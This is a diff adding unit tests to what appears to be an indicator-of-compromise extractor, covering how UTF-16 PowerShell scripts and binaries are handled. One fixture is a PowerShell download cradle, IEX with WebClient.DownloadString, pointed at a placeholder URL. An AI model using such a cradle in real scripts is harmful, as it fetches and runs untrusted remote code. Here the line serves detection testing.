@@ -346,6 +346,25 @@ class ExtractIocsTests(unittest.TestCase):
                                   is_ignored=lambda p: "tests" in p)
         self.assertEqual(result["iocs"], [])
 
+    def test_utf16_script_is_searched(self):
+        """PowerShell saves UTF-16, with or without a byte-order mark. It used
+        to be refused as binary for containing zero bytes."""
+        script = f"IEX (New-Object Net.WebClient).DownloadString('{FAKE_URL}')\r\n"
+        for name, data in (("bom.ps1", script.encode("utf-16")),
+                           ("le.ps1", script.encode("utf-16-le")),
+                           ("be.ps1", script.encode("utf-16-be"))):
+            self.write(name, data, "wb")
+            result = ioc.extract_iocs(self.root, [self.flag("/" + name)])
+            self.assertEqual(self.values(result, "url"), {FAKE_URL}, name)
+
+    def test_utf16_check_does_not_read_binaries_as_text(self):
+        """A zero byte every other byte only for a stretch, as in a binary
+        with a UTF-16 resource string, is not a text file."""
+        self.assertIsNone(ioc._utf16_encoding(b"\0\0" + FAKE_URL.encode()))
+        blob = bytes(range(256)) * 8 + FAKE_URL.encode("utf-16-le")
+        self.assertIsNone(ioc._utf16_encoding(blob))
+        self.assertEqual(ioc._utf16_encoding(FAKE_URL.encode("utf-16-le") * 4), "utf-16-le")
+
     def test_binary_is_hashed_but_not_searched(self):
         self.write("evil.bin", b"\0\0" + FAKE_URL.encode(), "wb")
         result = ioc.extract_iocs(self.root, [self.flag("/evil.bin")])
